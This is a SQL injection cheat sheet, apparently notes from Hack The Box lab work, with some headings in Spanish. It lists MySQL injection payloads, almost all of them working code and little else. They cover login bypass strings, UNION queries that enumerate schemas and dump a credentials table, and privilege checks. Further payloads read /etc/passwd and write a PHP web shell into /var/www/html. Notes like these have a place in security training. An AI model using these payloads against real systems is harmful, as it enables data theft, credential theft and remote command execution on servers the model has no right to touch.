# SQL Injection

## MySQL
Connection
```
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```
1. Subverting Query Logic
```
' or '1' = '1
```
2. Using Comments
```
' or '1' = '1-- -
admin')-- -
```
3. Union Clause
```
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -

' order by 2-- -
```
4. Database Enumeration
```
SELECT @@version
SELECT POW(1,1) #Only numeric ouputs
SELECT SLEEP(5)

# Information Schema
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- - #Current Database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #Table name
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #Columns
cn' UNION select 1, username, password, 4 from dev.credentials-- - #Data
```
5. Privileges
```
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
6. Leer archivos
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
7. Escribir archivos
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
